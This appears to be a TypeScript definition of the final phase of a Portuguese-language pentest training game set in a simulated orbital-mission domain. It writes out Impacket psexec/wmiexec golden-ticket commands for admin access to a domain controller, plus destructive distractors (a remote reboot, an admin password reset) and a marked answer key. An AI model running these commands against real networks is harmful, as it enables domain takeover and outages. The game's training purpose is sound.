import type { PhaseDefinition } from "./types";

export const phase13: PhaseDefinition = {
  number: 13,
  technicalName: "Mission Impact Assessment",
  thematicName: "Avaliação de impacto sobre operação orbital",
  objective:
    "Demonstrar acesso administrativo ao DC e mapear o impacto operacional sobre sistemas de missão (telemetria, planejamento, payload).",
  context: ds =>
    [
      `🛰️ Fase final. Você tem o Golden Ticket — agora prove o impacto.`,
      `   "Sou Domain Admin" é técnica; o que o cliente precisa é "se um adversário chegasse aqui,`,
      `   o que ele desliga, distorce ou exfiltra?". A resposta tem que conversar com missão orbital:`,
      `   janelas de passagem, integridade de produtos científicos, continuidade do enlace.`,
      ``,
      `🎯 Autentique-se como administrator contra ${ds.dcHost}, mostre membership de Domain Admins`,
      `   e enumere quais sistemas operacionais agora estão sob seu controle. NÃO derrube nada — escopo`,
      `   é demonstração, não destruição.`,
      ``,
      `❓ Você vai fechar respondendo: dos sistemas comprometidos, quais 3 trariam maior impacto sobre a missão?`,
      ``,
      `👉 Comando esperado: psexec.py  (wmiexec.py é caminho válido e mais limpo)`
    ].join("\n"),
  expectedCommand: "psexec.py",
  acceptedCommands: ["wmiexec.py"],
  interpretationQuestion:
    "Liste 3 sistemas operacionais (do domínio simulado) cujo comprometimento traria maior impacto sobre a missão orbital e justifique a ordem.",
  options: [
    {
      id: "a",
      text: "psexec.py -k -no-pass {dom}/administrator@{dc}.{dom}",
      correct: true,
      response: ds =>
        [
          `[*] Requesting shares on ${ds.dcHost}.....`,
          `[*] Found writable share ADMIN$`,
          `[*] Connecting to SMBv3 dialect`,
          `[+] Login OK (administrator)`,
          ``,
          `C:\\Windows\\system32> whoami`,
          `${ds.netbios}\\administrator`,
          ``,
          `C:\\Windows\\system32> net group "Domain Admins" /domain`,
          `Group name     Domain Admins`,
          `Members        Administrator, ${ds.dcSyncPrincipal}, svc-iamcore-admin`,
          ``,
          `[+] DOMÍNIO COMPROMETIDO.`,
          `[+] Sistemas afetados: telemetria, planejamento de missão, propagação orbital, arquivo de payload.`
        ].join("\n"),
      scoreDelta: 1.6,
      detectionDelta: 10,
      budgetDelta: -8,
      finalPhase: true,
      unlockEvidences: ds => [
        {
          label: "Comprometimento de domínio confirmado",
          payload: {
            dc: ds.dcHost,
            domain: ds.domain,
            asUser: "administrator",
            via: "Golden Ticket + psexec (-k -no-pass)",
            criticalSystems: ds.hosts.slice(0, 5).map(h => h.hostname)
          }
        }
      ],
      flag: ds => ds.flags.p13
    },
    {
      id: "b",
      text: "wmiexec.py -k -no-pass {dom}/administrator@{dc}.{dom}",
      correct: true,
      alternativePath: true,
      response: ds =>
        [
          `[*] Conexão SMBv3 OK`,
          `[+] Sessão administrator obtida via WMI no DC ${ds.dcHost}.`,
          `[+] Caminho menos ruidoso para concluir a missão.`
        ].join("\n"),
      scoreDelta: 1.7,
      detectionDelta: 6,
      budgetDelta: -7,
      finalPhase: true,
      unlockEvidences: ds => [
        {
          label: "Comprometimento de domínio via WMI",
          payload: { dc: ds.dcHost, asUser: "administrator", via: "Golden Ticket + wmiexec" }
        }
      ],
      flag: ds => ds.flags.p13
    },
    {
      id: "c",
      text: "shutdown /r /m \\\\{dc} /t 0",
      correct: false,
      response: () =>
        "Reiniciar o DC compromete disponibilidade e ultrapassa escopo autorizado — ação destrutiva.",
      scoreDelta: -2.0,
      detectionDelta: 30,
      budgetDelta: -10
    },
    {
      id: "d",
      text: "net user administrator P@ssw0rd123! /domain",
      correct: false,
      response: () =>
        "Trocar senha do administrator é destrutivo e fora de escopo — alerta crítico em IAM.",
      scoreDelta: -2.0,
      detectionDelta: 28,
      budgetDelta: -10
    },
    {
      id: "e",
      text: "Get-ADUser administrator -Properties pwdLastSet",
      correct: false,
      response: () =>
        "Consulta inofensiva mas não demonstra impacto. Fase fica incompleta.",
      scoreDelta: -0.3,
      detectionDelta: 2,
      budgetDelta: -3
    }
  ],
  techExplanation:
    "A avaliação de impacto não é só 'sou admin?' — é mapear que sistemas operacionais o acesso permite afetar. Em segmento solo: telemetria (perda de visibilidade), planejamento (cancelamento/alteração de janelas), payload (corrupção de produtos científicos)."
};
